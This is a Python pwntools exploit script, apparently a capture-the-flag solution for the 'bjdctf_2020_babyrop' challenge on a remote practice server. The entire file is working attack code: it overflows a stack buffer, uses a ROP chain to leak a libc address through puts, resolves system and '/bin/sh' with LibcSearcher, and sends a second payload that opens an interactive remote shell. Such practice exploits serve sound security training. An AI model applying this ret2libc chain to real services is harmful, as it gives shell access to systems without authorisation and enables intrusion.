#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher


filename = './bjdctf_2020_babyrop'
e = ELF(filename)
# p = process(filename)
p = remote("node3.buuoj.cn", 28912)

log.level = 'DEBUG'
for k, v in e.got.items():
    log.debug(f'got:{k}={hex(v)}')

vuln = e.sym['vuln']
puts_plt, c_func_got = e.plt['puts'], e.got['__libc_start_main']
log.info(f'put:plt={hex(puts_plt)}, __libc_start_main:got={hex(c_func_got)}')

ra_offset = 0x20 + 8
# ROPgadget --binary bjdctf_2020_babyrop --only 'pop|ret'
pop_rdi_ret = 0x0000000000400733 
payload_leak = b'1' * ra_offset + p64(pop_rdi_ret) + p64(c_func_got) + p64(puts_plt) + p64(vuln)

p.recvuntil(b'story!\n')
p.sendline(payload_leak)

start_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f'put:{hex(start_addr)}')

searcher = LibcSearcher()
searcher.add_condition('__libc_start_main', start_addr)
base_addr = start_addr - searcher.dump('__libc_start_main')
system_addr = base_addr + searcher.dump('system')
bin_sh_addr = base_addr + searcher.dump('str_bin_sh')

log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
payload = b'2' * ra_offset + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload)
p.interactive()
